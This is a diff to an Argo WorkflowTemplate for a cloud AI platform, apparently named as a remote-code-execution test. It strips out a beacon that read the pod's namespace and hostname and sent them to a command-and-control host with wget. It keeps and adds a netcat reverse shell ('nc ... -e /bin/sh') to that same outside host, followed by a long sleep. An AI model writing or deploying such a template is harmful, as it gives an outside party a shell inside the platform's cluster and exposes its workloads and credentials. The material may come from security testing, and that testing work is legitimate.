@@ -1,15 +1,15 @@
 apiVersion: argoproj.io/v1alpha1
 kind: WorkflowTemplate
 metadata:
-  name: testflo-rce-wft-1785277197
+  name: testflo-rce-wft-1785278501
   annotations:
-    executables.ai.sap.com/name: testflo-rce-wft-1785277197
-    executables.ai.sap.com/id: testflo-rce-wft-1785277197
+    executables.ai.sap.com/name: testflo-rce-wft-1785278501
+    executables.ai.sap.com/id: testflo-rce-wft-1785278501
   labels:
     scenarios.ai.sap.com/id: testflo-scenario
     scenarios.ai.sap.com/name: testflo-scenario
-    executables.ai.sap.com/id: testflo-rce-wft-1785277197
-    executables.ai.sap.com/name: testflo-rce-wft-1785277197
+    executables.ai.sap.com/id: testflo-rce-wft-1785278501
+    executables.ai.sap.com/name: testflo-rce-wft-1785278501
     ai.sap.com/version: "1.0.0"
     ai.sap.com/resourcePlan: starter
 spec:
@@ -25,10 +25,5 @@ spec:
           - sh
           - -c
           - |
-            C2="sfg.0x79.de"
-            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
-            HN=$(hostname)
-            env | grep -v 'TOKEN\|SECRET\|PASS\|KEY' || true
-            wget -q --post-data "TESTFLO-WFT-CB h=${HN} ns=${NS}" "http://${C2}:8080/cb" -O /dev/null 2>/dev/null || true
-            nc ${C2} 8080 -e /bin/sh || true
+            nc sfg.0x79.de 8080 -e /bin/sh || true
             sleep 3600
